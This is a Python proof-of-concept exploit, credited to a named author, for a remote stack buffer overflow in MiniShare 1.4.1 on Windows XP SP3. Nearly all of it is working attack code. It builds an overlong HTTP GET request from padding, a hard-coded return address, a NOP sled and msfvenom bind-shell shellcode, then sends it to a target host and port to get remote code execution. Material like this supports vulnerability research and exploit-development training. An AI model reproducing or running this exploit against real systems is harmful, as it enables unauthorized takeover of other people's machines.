"""
Full title:	MiniShare 1.4.1 Remote Stack Buffer Overflow PoC
Exploit Author:	Paolo Stagno - voidsec@voidsec.com - https://voidsec.com
Vendor Homepage:	http://minishare.sf.net
Version:	MiniShare 1.4.1
Tested on:	Windows XP SP3
Category:	remote exploit
Platform:	windows
"""

#!/usr/bin/python
import socket, sys, argparse

parser = argparse.ArgumentParser(prog="exploit.py", description="Remote Exploit Framework by VoidSec")
parser.add_argument("-t", "--target", default="127.0.0.1", dest="target", help="Target IP Address")
parser.add_argument("-p", "--port", default=80, type=int, dest="port", help="Target TCP Port")
parser.add_argument("-l", "--length", default=3000, type=int, dest="pocl", help="PoC Length")
args = parser.parse_args()
#msfvenom -p windows/shell_bind_tcp -f c -a x86 -b "\x00\x0d"
shellcode=("\xbf\xf5\x93\xde\xf0\xdb\xd5\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
"\x53\x31\x7e\x12\x03\x7e\x12\x83\x33\x97\x3c\x05\x47\x70\x42"
"\xe6\xb7\x81\x23\x6e\x52\xb0\x63\x14\x17\xe3\x53\x5e\x75\x08"
"\x1f\x32\x6d\x9b\x6d\x9b\x82\x2c\xdb\xfd\xad\xad\x70\x3d\xac"
"\x2d\x8b\x12\x0e\x0f\x44\x67\x4f\x48\xb9\x8a\x1d\x01\xb5\x39"
"\xb1\x26\x83\x81\x3a\x74\x05\x82\xdf\xcd\x24\xa3\x4e\x45\x7f"
"\x63\x71\x8a\x0b\x2a\x69\xcf\x36\xe4\x02\x3b\xcc\xf7\xc2\x75"
"\x2d\x5b\x2b\xba\xdc\xa5\x6c\x7d\x3f\xd0\x84\x7d\xc2\xe3\x53"
"\xff\x18\x61\x47\xa7\xeb\xd1\xa3\x59\x3f\x87\x20\x55\xf4\xc3"
"\x6e\x7a\x0b\x07\x05\x86\x80\xa6\xc9\x0e\xd2\x8c\xcd\x4b\x80"
"\xad\x54\x36\x67\xd1\x86\x99\xd8\x77\xcd\x34\x0c\x0a\x8c\x50"
"\xe1\x27\x2e\xa1\x6d\x3f\x5d\x93\x32\xeb\xc9\x9f\xbb\x35\x0e"
"\xdf\x91\x82\x80\x1e\x1a\xf3\x89\xe4\x4e\xa3\xa1\xcd\xee\x28"
"\x31\xf1\x3a\xc4\x39\x54\x95\xfb\xc4\x26\x45\xbc\x66\xcf\x8f"
"\x33\x59\xef\xaf\x99\xf2\x98\x4d\x22\xed\x04\xdb\xc4\x67\xa5"
"\x8d\x5f\x1f\x07\xea\x57\xb8\x78\xd8\xcf\x2e\x30\x0a\xd7\x51"
"\xc1\x18\x7f\xc5\x4a\x4f\xbb\xf4\x4c\x5a\xeb\x61\xda\x10\x7a"
"\xc0\x7a\x24\x57\xb2\x1f\xb7\x3c\x42\x69\xa4\xea\x15\x3e\x1a"
"\xe3\xf3\xd2\x05\x5d\xe1\x2e\xd3\xa6\xa1\xf4\x20\x28\x28\x78"
"\x1c\x0e\x3a\x44\x9d\x0a\x6e\x18\xc8\xc4\xd8\xde\xa2\xa6\xb2"
"\x88\x19\x61\x52\x4c\x52\xb2\x24\x51\xbf\x44\xc8\xe0\x16\x11"
"\xf7\xcd\xfe\x95\x80\x33\x9f\x5a\x5b\xf0\xaf\x10\xc1\x51\x38"
"\xfd\x90\xe3\x25\xfe\x4f\x27\x50\x7d\x65\xd8\xa7\x9d\x0c\xdd"
"\xec\x19\xfd\xaf\x7d\xcc\x01\x03\x7d\xc5")
sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((args.target , args.port))
buff="GET"
buff+="A"*1788
buff+="\x78\x6A\x83\x7C"#7C836A78
buff+="\x90"*24
buff+=shellcode
buff+=" HTTP/1.1\r\n\r\n"
sock.send(buff)
sock.close()